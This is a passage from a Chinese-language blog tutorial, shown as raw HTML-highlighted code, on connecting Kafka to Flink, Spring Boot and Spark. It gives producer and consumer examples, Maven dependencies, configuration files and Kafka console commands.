class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 0 初始化 flink 环境</span></span><br><span class="line">    StreamExecutionEnvironment env =</span><br><span class="line">            StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// 1 读取集合中数据</span></span><br><span class="line">    ArrayList&lt;String&gt; wordsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    wordsList.add(<span class="string">"hello"</span>);</span><br><span class="line">    wordsList.add(<span class="string">"world"</span>);</span><br><span class="line">    DataStream&lt;String&gt; stream = env.fromCollection(wordsList);</span><br><span class="line">    <span class="comment">// 2 kafka 生产者配置信息</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">"hadoop102:9092"</span>);</span><br><span class="line">    <span class="comment">// 3 创建 kafka 生产者</span></span><br><span class="line">    FlinkKafkaProducer&lt;String&gt; kafkaProducer = <span class="keyword">new</span> FlinkKafkaProducer&lt;&gt;(</span><br><span class="line">            <span class="string">"first"</span>,</span><br><span class="line">            <span class="keyword">new</span> SimpleStringSchema(),</span><br><span class="line">            properties</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 4 生产者和 flink 流关联</span></span><br><span class="line">    stream.addSink(kafkaProducer);</span><br><span class="line">    <span class="comment">// 5 执行</span></span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 Kafka 消费者</span></span><br><span class="line"><span class="comment">// bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first</span></span><br><span class="line"><span class="comment">// 执行 FlinkKafkaProducer1 程序，观察 kafka 消费者控制台情况</span></span><br></pre></td></tr></table></figure><p>Flink 消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 初始化 flink 环境</span></span><br><span class="line">    StreamExecutionEnvironment env =</span><br><span class="line">            StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// 1 kafka 消费者配置信息</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    properties.setProperty(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG,</span><br><span class="line">            <span class="string">"hadoop102:9092"</span>);</span><br><span class="line">    <span class="comment">// 2 创建 kafka 消费者</span></span><br><span class="line">    FlinkKafkaConsumer&lt;String&gt; kafkaConsumer = <span class="keyword">new</span> FlinkKafkaConsumer&lt;&gt;(</span><br><span class="line">            <span class="string">"first"</span>,</span><br><span class="line">            <span class="keyword">new</span> SimpleStringSchema(),</span><br><span class="line">            properties</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 3 消费者和 flink 流关联</span></span><br><span class="line">    env.addSource(kafkaConsumer).print();</span><br><span class="line">    <span class="comment">// 4 执行</span></span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 FlinkKafkaConsumer1 消费者</span></span><br><span class="line"><span class="comment">// 启动 kafka 生产者</span></span><br><span class="line"><span class="comment">// bin/kafka-console-producer.sh --bootstrap-server hadoop102:9092 --topic first</span></span><br></pre></td></tr></table></figure><h2 id="3、集成-SpringBoot">3、集成 SpringBoot</h2><p>首先是导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- spring-kafka --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-1-简单Demo">3.1 简单Demo</h3><p>添加lombok插件，spring-boot-starter-web依赖以及spring-kafka依赖。首先修改 SpringBoot 核心配置文件 application.propeties, 添加生产者相关信息</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 应用名称</span></span><br><span class="line"><span class="meta">spring.application.name</span>=<span class="string">atguigu_springboot_kafka</span></span><br><span class="line"><span class="comment"># 指定 kafka 的地址</span></span><br><span class="line"><span class="meta">spring.kafka.bootstrap-servers</span>=<span class="string">hadoop102:9092,hadoop103:9092,hadoop104:9092</span></span><br><span class="line"><span class="comment">#指定 key 和 value 的序列化器</span></span><br><span class="line"><span class="meta">spring.kafka.producer.key-serializer</span>=<span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"><span class="meta">spring.kafka.producer.value-serializer</span>=<span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =========消费者配置开始=========</span></span><br><span class="line"><span class="comment"># 指定 kafka 的地址</span></span><br><span class="line"><span class="comment"># spring.kafka.bootstrap-servers=hadoop102:9092,hadoop103:9092,hadoop104:9092</span></span><br><span class="line"><span class="comment"># 指定 key 和 value 的反序列化器</span></span><br><span class="line"><span class="meta">spring.kafka.consumer.key-deserializer</span>=<span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"><span class="meta">spring.kafka.consumer.value-deserializer</span>=<span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"><span class="comment">#指定消费者组的 group_id</span></span><br><span class="line"><span class="meta">spring.kafka.consumer.group-id</span>=<span class="string">atguigu</span></span><br><span class="line"><span class="comment"># =========消费者配置结束=========</span></span><br></pre></td></tr></table></figure><p>创建 controller 从浏览器接收数据, 并写入指定的 topic</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProducerController</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Kafka 模板用来向 kafka 发送数据</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    KafkaTemplate&lt;String, String&gt; kafka;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/atguigu"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">data</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        kafka.send(<span class="string">"first"</span>, msg);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在浏览器中给/atguigu 接口发送数据</span></span><br></pre></td></tr></table></figure><p>SpringBoot 消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaConsumer</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 指定要监听的 topic</span></span><br><span class="line">    <span class="meta">@KafkaListener</span>(topics = <span class="string">"first"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">consumeTopic</span><span class="params">(String msg)</span> </span>&#123; <span class="comment">// 参数: 收到的 value</span></span><br><span class="line">        System.out.println(<span class="string">"收到的信息: "</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向 first 主题发送数据</span></span><br><span class="line"><span class="comment">// bin/kafka-console-producer.sh --bootstrap-server hadoop102:9092 --topic first</span></span><br></pre></td></tr></table></figure><h3 id="3-2-完整Demo">3.2 完整Demo</h3><p>这次是yml配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kafka 配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">bootstrap-servers:</span> <span class="string">localhost:9092</span></span><br><span class="line">    <span class="attr">producer:</span></span><br><span class="line">      <span class="comment"># 发生错误后，消息重发的次数。</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">1</span></span><br><span class="line">      <span class="comment">#当有多个消息需要被发送到同一个分区时，生产者会把它们放在同一个批次里。该参数指定了一个批次可以使用的内存大小，按照字节数计算。</span></span><br><span class="line">      <span class="attr">batch-size:</span> <span class="number">16384</span></span><br><span class="line">      <span class="comment"># 设置生产者内存缓冲区的大小。</span></span><br><span class="line">      <span class="attr">buffer-memory:</span> <span class="number">33554432</span></span><br><span class="line">      <span class="comment"># 键的序列化方式</span></span><br><span class="line">      <span class="attr">key-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="comment"># 值的序列化方式</span></span><br><span class="line">      <span class="attr">value-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="comment"># acks=0 ： 生产者在成功写入消息之前不会等待任何来自服务器的响应。</span></span><br><span class="line">      <span class="comment"># acks=1 ： 只要集群的首领节点收到消息，生产者就会收到一个来自服务器成功响应。</span></span><br><span class="line">      <span class="comment"># acks=all ：只有当所有参与复制的节点全部收到消息时，生产者才会收到一个来自服务器的成功响应。</span></span><br><span class="line">      <span class="attr">acks:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">consumer:</span></span><br><span class="line">      <span class="comment"># 自动提交的时间间隔 在spring boot 2.X 版本中这里采用的是值的类型为Duration 需要符合特定的格式，如1S,1M,2H,5D</span></span><br><span class="line">      <span class="attr">auto-commit-interval:</span> <span class="string">1S</span></span><br><span class="line">      <span class="comment"># 该属性指定了消费者在读取一个没有偏移量的分区或者偏移量无效的情况下该作何处理：</span></span><br><span class="line">      <span class="comment"># latest（默认值）在偏移量无效的情况下，消费者将从最新的记录开始读取数据（在消费者启动之后生成的记录）</span></span><br><span class="line">      <span class="comment"># earliest ：在偏移量无效的情况下，消费者将从起始位置读取分区的记录</span></span><br><span class="line">      <span class="attr">auto-offset-reset:</span> <span class="string">earliest</span></span><br><span class="line">      <span class="comment"># 是否自动提交偏移量，默认值是true,为了避免出现重复数据和数据丢失，可以把它设置为false,然后手动提交偏移量</span></span><br><span class="line">      <span class="attr">enable-auto-commit:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 键的反序列化方式</span></span><br><span class="line">      <span class="attr">key-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line">      <span class="comment"># 值的反序列化方式</span></span><br><span class="line">      <span class="attr">value-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="comment"># 在侦听器容器中运行的线程数。</span></span><br><span class="line">      <span class="attr">concurrency:</span> <span class="number">5</span></span><br><span class="line">      <span class="comment"># listner负责ack，每调用一次，就立即commit</span></span><br><span class="line">      <span class="attr">ack-mode:</span> <span class="string">manual_immediate</span></span><br><span class="line">      <span class="attr">missing-topics-fatal:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>创建消息生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaProducer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Logger logger = LoggerFactory.getLogger(KafkaProducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String, Object&gt; kafkaTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TOPIC_TEST = <span class="string">"Hello-Kafka"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TOPIC_GROUP = <span class="string">"test-consumer-group"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        String obj2String = JSON.toJSONString(obj);</span><br><span class="line">        logger.info(<span class="string">"准备发送消息为：&#123;&#125;"</span>, obj2String);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        ListenableFuture&lt;SendResult&lt;String, Object&gt;&gt; future = kafkaTemplate.send(TOPIC_TEST, obj);</span><br><span class="line">        future.addCallback(<span class="keyword">new</span> ListenableFutureCallback&lt;SendResult&lt;String, Object&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Throwable throwable)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//发送失败的处理</span></span><br><span class="line">                logger.info(TOPIC_TEST + <span class="string">" - 生产者 发送消息失败："</span> + throwable.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(SendResult&lt;String, Object&gt; stringObjectSendResult)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//成功的处理</span></span><br><span class="line">                logger.info(TOPIC_TEST + <span class="string">" - 生产者 发送消息成功："</span> + stringObjectSendResult.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建消息消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaConsumer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Logger logger = LoggerFactory.getLogger(KafkaConsumer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@KafkaListener</span>(topics = KafkaProducer.TOPIC_TEST, groupId = KafkaProducer.TOPIC_GROUP)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">topicTest</span><span class="params">(ConsumerRecord&lt;?, ?&gt; record, Acknowledgment ack, @Header(KafkaHeaders.RECEIVED_TOPIC)</span> String topic) </span>&#123;</span><br><span class="line">        Optional&lt;?&gt; message = Optional.ofNullable(record.value());</span><br><span class="line">        <span class="keyword">if</span> (message.isPresent()) &#123; <span class="comment">// 包含非空值，则执行</span></span><br><span class="line">            Object msg = message.get();</span><br><span class="line">            logger.info(<span class="string">"topic_test 消费了： Topic:"</span> + topic + <span class="string">",Message:"</span> + msg);</span><br><span class="line">            ack.acknowledge(); <span class="comment">// 确认成功消费一个消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringRunner<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">SpringBootTest</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">KafkaProducerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Logger logger = LoggerFactory.getLogger(KafkaProducerTest<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> KafkaProducer kafkaProducer; <span class="comment">// 注意使用自己创建的，看清楚！</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      测试之前需要开启 Kafka 服务</span></span><br><span class="line"><span class="comment">      启动 Zookeeper：bin/zookeeper-server-start.sh -daemon config/zookeeper.properties</span></span><br><span class="line"><span class="comment">      启动 Kafka：bin/kafka-server-start.sh -daemon config/server.properties</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      测试结果数据：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      准备发送消息为："你好，我是Lottery 001"</span></span><br><span class="line"><span class="comment">      Hello-Kafka - 生产者 发送消息成功：SendResult [producerRecord=ProducerRecord(topic=Hello-Kafka, partition=null,</span></span><br><span class="line"><span class="comment">      headers=RecordHeaders(headers = [], isReadOnly = true), key=null, value=你好，我是Lottery 001, timestamp=null),</span></span><br><span class="line"><span class="comment">      recordMetadata=Hello-Kafka-0@47]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      topic_test 消费了： Topic:Hello-Kafka,Message:你好，我是Lottery 001</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test_send</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 循环发送消息</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            kafkaProducer.send(<span class="string">"你好，我是Lottery 001"</span>);</span><br><span class="line">            Thread.sleep(<span class="number">3500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、集成-Spark">4、集成 Spark</h2><p>创建一个 maven 项目 spark-kafka，在项目 spark-kafka 上点击右键，Add Framework Support=》勾选 scala，在 main 下创建 scala 文件夹，并右键 Mark Directory as Sources Root=&gt;在 scala 下创建包名为 com.atguigu.spark，添加配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming-kafka-0-10_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将 log4j.properties 文件添加到 resources 里面，就能更改打印日志的级别为 error，见上面</p><p>Spark 生产者</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkKafkaProducer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="comment">// 0 kafka 配置信息</span></span><br><span class="line">        <span class="keyword">val</span> properties = <span class="keyword">new</span> <span class="type">Properties</span>()</span><br><span class="line">        properties.put(<span class="type">ProducerConfig</span>.<span class="type">BOOTSTRAP_SERVERS_CONFIG</span>, <span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">        properties.put(<span class="type">ProducerConfig</span>.<span class="type">KEY_SERIALIZER_CLASS_CONFIG</span>, classOf[<span class="type">StringSerializer</span>])</span><br><span class="line">        properties.put(<span class="type">ProducerConfig</span>.<span class="type">VALUE_SERIALIZER_CLASS_CONFIG</span>, classOf[<span class="type">StringSerializer</span>])</span><br><span class="line">        <span class="comment">// 1 创建 kafka 生产者</span></span><br><span class="line">        <span class="keyword">var</span> producer = <span class="keyword">new</span> <span class="type">KafkaProducer</span>[<span class="type">String</span>, <span class="type">String</span>](properties)</span><br><span class="line">        <span class="comment">// 2 发送数据</span></span><br><span class="line">        <span class="keyword">for</span> (i &lt;- <span class="number">1</span> to <span class="number">5</span>)&#123;</span><br><span class="line">            producer.send(<span class="keyword">new</span></span><br><span class="line">                <span class="type">ProducerRecord</span>[<span class="type">String</span>,<span class="type">String</span>](<span class="string">"first"</span>,<span class="string">"atguigu"</span> + i))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3 关闭资源</span></span><br><span class="line">        producer.close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 Kafka 消费者</span></span><br></pre></td></tr></table></figure><p>Spark 消费者，添加配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming-kafka-0-10_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 